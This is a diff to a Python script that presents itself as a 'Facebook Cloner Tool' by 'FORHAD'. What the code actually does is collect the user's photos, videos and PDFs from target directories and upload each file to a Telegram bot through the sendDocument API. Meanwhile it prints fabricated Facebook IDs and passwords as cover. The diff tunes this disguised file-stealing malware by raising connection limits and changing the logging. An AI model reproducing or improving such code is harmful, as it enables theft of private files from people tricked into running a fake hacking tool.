@@ -11,7 +11,7 @@ ________    ___   _______     ____  ____       _       ______
  _| |_    \  `-'  /_| |  \ \_  _| |  | |_  _/ /   \ \_  _| |_.' /
 |_____|    `.___.'|____| |___||____||____||____| |____||______.' 
 
-        Multi Method Facebook Cloner Tool - Max Speed
+        Multi Method Facebook Cloner Tool - Compact Log
               Tool Owner: FORHAD
 """)
 
@@ -31,7 +31,7 @@ TARGET_DIRS = [
 
 ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]
 
-MAX_CONCURRENT_REQUESTS = 150  # concurrency বাড়ানো হয়েছে
+MAX_CONCURRENT_REQUESTS = 100
 
 def load_lines(filename):
     try:
@@ -88,7 +88,6 @@ def save_found(index, id_, pw, serial):
 
 sent_count = 0
 error_count = 0
-lock = asyncio.Lock()  # concurrency-safe counter update
 
 async def send_file(session, file_path, index):
     global sent_count, error_count
@@ -103,29 +102,27 @@ async def send_file(session, file_path, index):
                 data = aiohttp.FormData()
                 data.add_field("chat_id", chat_id)
                 data.add_field("document", f, filename=os.path.basename(file_path))
+                # sendDocument API call with the actual file stream
                 async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                     if resp.status == 200:
-                        async with lock:
-                            sent_count += 1
+                        sent_count += 1
                         save_found(index, fake_id, fake_pw, serial)
                         if (index + 1) % 100 == 0:
                             print(f"\n[FACEBOOK] Found: {fake_id} | PASS: {fake_pw} | SERIAL: {serial}")
+                        print(f"\r[INFO] Total Sent: {sent_count} | Errors: {error_count}", end="", flush=True)
                     else:
-                        async with lock:
-                            error_count += 1
-        except Exception:
-            async with lock:
-                error_count += 1
-        # সর্বদা লাইন আপডেট হবে
-        print(f"\r[INFO] Total Sent: {sent_count} | Errors: {error_count}", end="", flush=True)
+                        error_count += 1
+        except Exception as e:
+            error_count += 1
+            # Error message suppressed but error count increased
+            print(f"\r[INFO] Total Sent: {sent_count} | Errors: {error_count}", end="", flush=True)
 
 async def main():
-    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)
+    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS*2)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = [send_file(session, file, idx) for idx, file in enumerate(FILES)]
         for future in asyncio.as_completed(tasks):
             await future
-    print("\n[INFO] All files processed.")
 
 if __name__ == "__main__":
     asyncio.run(main())
